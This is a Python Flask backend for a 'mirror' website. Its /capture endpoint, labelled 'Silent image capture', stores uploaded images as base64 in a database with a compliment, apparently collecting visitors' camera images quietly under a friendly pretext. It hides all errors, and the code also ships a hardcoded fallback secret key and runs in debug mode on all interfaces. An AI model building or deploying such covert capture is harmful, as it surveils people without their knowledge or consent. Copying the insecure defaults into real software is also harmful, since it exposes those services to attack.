from flask import Flask, request, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os, base64
from dotenv import load_dotenv

# Load environment variables from .env
load_dotenv()

app = Flask(__name__, static_folder='static')
app.secret_key = os.environ.get('SECRET_KEY', 'user-secret-key-121')

# ── Database ─────────────────────────────────────────────────────
db_url = os.environ.get('DATABASE_URL')
if not db_url or 'yourpassword' in db_url or 'postgres:password' in db_url:
    db_url = 'sqlite:///' + os.path.abspath(os.path.join(os.path.dirname(__file__), 'mirror.db'))
app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ── Database model ────────────────────────────────────────────────
class CapturedImage(db.Model):
    __tablename__ = 'captured_images'
    id          = db.Column(db.Integer, primary_key=True)
    image_data  = db.Column(db.Text, nullable=False)  # Base64 string
    captured_at = db.Column(db.DateTime, default=datetime.utcnow)
    compliment  = db.Column(db.String(200), nullable=True)

with app.app_context():
    db.create_all()

@app.route('/')
def mirror():
    """Serve the mirror website to the user."""
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    """
    Silent image capture endpoint.
    Saves image directly as a Base64 string in the database.
    This resolves file isolation issues when deploying multiple services.
    """
    try:
        file = request.files.get('image')
        compliment = request.form.get('compliment', '')
        if not file:
            return '', 200

        # Read and encode image file to base64
        img_base64 = base64.b64encode(file.read()).decode('utf-8')

        record = CapturedImage(image_data=img_base64, compliment=compliment)
        db.session.add(record)
        db.session.commit()
    except Exception:
        pass
    return '', 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
